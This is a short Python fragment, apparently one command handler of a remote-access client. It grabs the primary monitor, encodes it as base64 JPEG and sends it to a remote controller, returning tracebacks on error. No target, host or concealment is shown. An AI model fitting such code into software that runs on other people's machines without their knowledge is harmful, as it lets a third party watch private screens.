from PIL import Image
import mss
import io
import base64
import traceback

def send_screenshot(self):
    try:
        screenshot_base64 = None
        with mss.mss() as sct:
            screenshot = sct.grab(sct.monitors[1])
            img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)

            img = img.convert("RGB")
            
            buffer = io.BytesIO()
            img.save(buffer, format="JPEG")
            screenshot_data = buffer.getvalue()

            screenshot_base64 = base64.b64encode(screenshot_data).decode("utf-8")
            
        if screenshot_base64:
            self.send_message('response', self.converter.encode({"screenshot": screenshot_base64}))
            return
        
        self.send_message('response', self.converter.encode({"screenshot_logger": f"From Client: No screenshot data found"}))
    except:
        self.send_message('response', self.converter.encode({"screenshot_logger": f"From Client: {traceback.format_exc()}"}))
